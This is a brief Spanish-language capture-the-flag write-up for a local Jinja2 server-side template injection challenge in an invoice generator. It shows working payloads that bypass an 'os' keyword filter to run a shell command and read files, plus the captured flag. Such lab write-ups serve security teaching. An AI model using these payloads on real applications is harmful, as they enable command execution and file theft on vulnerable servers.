# IntraCorp CTF - SSTI

## Detalles

- IntraCorp CTF Challenge 04 - Server-Side Template Injection (Jinja2)
- http://localhost:8004/

## Vulnerabilidad

- SSTI en campo `customer_name` del generador de facturas
- Filtro bloquea la palabra `os`
- Flag en `/home/app/flag.txt`

## Inicio

```bash
docker-compose up -d challenge4
open http://localhost:8004/
```

## Writeup

### Confirmar SSTI

```
{{7*7}}
```
Resultado: `49`

### Leer flag (bypass del filtro "os")

```
{{ self.__init__.__globals__.__builtins__.__import__('o''s').popen('cat /home/app/flag.txt').read() }}
```

### Alternativa sin usar os

```
{{ lipsum.__globals__['__builtins__']['open']('/home/app/flag.txt').read() }}
```

## Flag

```
HACKCON{SST1_W1TH0UT_0S}
```
